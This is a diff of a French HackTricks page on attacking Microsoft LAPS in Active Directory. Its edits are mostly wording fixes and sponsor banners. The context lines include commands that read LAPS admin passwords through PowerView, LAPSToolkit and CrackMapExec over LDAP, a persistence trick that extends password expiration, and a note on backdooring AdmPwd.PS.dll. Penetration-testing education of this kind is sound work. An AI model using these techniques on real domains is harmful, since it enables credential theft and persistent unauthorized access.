@@ -12,11 +12,16 @@
 
 </details>
 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+
 ## Informations de base
 
-Local Administrator Password Solution (LAPS) est un outil utilisé pour gérer un système où les **mots de passe administrateur**, qui sont **uniques, aléatoires et fréquemment modifiés**, sont appliqués aux ordinateurs joints à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne sont accessibles qu'aux utilisateurs ayant reçu l'autorisation via des listes de contrôle d'accès (ACL). La sécurité des transmissions de mots de passe du client vers le serveur est assurée par l'utilisation de **Kerberos version 5** et du **Standard de Cryptage Avancé (AES)**.
+Local Administrator Password Solution (LAPS) est un outil utilisé pour gérer un système où les **mots de passe administrateur**, qui sont **uniques, aléatoires et fréquemment modifiés**, sont appliqués aux ordinateurs joints au domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne sont accessibles qu'aux utilisateurs ayant reçu l'autorisation via des listes de contrôle d'accès (ACL). La sécurité des transmissions de mot de passe du client vers le serveur est assurée par l'utilisation de **Kerberos version 5** et du **Standard de Cryptage Avancé (AES)**.
 
-Dans les objets informatiques du domaine, la mise en œuvre de LAPS entraîne l'ajout de deux nouveaux attributs : **`ms-mcs-AdmPwd`** et **`ms-mcs-AdmPwdExpirationTime`**. Ces attributs stockent respectivement le **mot de passe administrateur en texte clair** et **son heure d'expiration**.
+Dans les objets informatiques du domaine, la mise en œuvre de LAPS se traduit par l'ajout de deux nouveaux attributs : **`ms-mcs-AdmPwd`** et **`ms-mcs-AdmPwdExpirationTime`**. Ces attributs stockent respectivement le **mot de passe administrateur en texte clair** et **son heure d'expiration**.
 
 ### Vérifier s'il est activé
 ```bash
@@ -66,7 +71,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ```
 ### LAPSToolkit
 
-Le [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l'énumération des LAPS avec plusieurs fonctions.\
+Le [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l'énumération de LAPS avec plusieurs fonctions.\
 L'une d'entre elles est l'analyse des **`ExtendedRights`** pour **tous les ordinateurs avec LAPS activé.** Cela montrera les **groupes** spécifiquement **délégués pour lire les mots de passe LAPS**, qui sont souvent des utilisateurs dans des groupes protégés.\
 Un **compte** qui a **rejoint un ordinateur** à un domaine reçoit `Tous les droits étendus` sur cet hôte, et ce droit donne au **compte** la capacité de **lire les mots de passe**. L'énumération peut montrer un compte utilisateur qui peut lire le mot de passe LAPS sur un hôte. Cela peut nous aider à **cibler des utilisateurs AD spécifiques** qui peuvent lire les mots de passe LAPS.
 ```powershell
@@ -93,7 +98,7 @@ ComputerName                Password       Expiration
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Extraction des mots de passe LAPS avec Crackmapexec**
-S'il n'y a pas d'accès à un powershell, vous pouvez abuser de ce privilège à distance via LDAP en utilisant
+Si vous n'avez pas accès à PowerShell, vous pouvez abuser de ce privilège à distance via LDAP en utilisant
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -111,7 +116,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Le mot de passe sera toujours réinitialisé si un **administrateur** utilise la cmdlet **`Reset-AdmPwdPassword`**; ou si **Ne pas autoriser un temps d'expiration de mot de passe plus long que celui requis par la stratégie** est activé dans le GPO LAPS.
+Le mot de passe sera toujours réinitialisé si un **administrateur** utilise la cmdlet **`Reset-AdmPwdPassword`** ; ou si **Ne pas autoriser un temps d'expiration de mot de passe plus long que celui requis par la stratégie** est activé dans le GPO LAPS.
 {% endhint %}
 
 ### Backdoor
@@ -123,12 +128,16 @@ Ensuite, il suffit de compiler le nouveau `AdmPwd.PS.dll` et de le téléverser 
 ## Références
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
 <details>
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
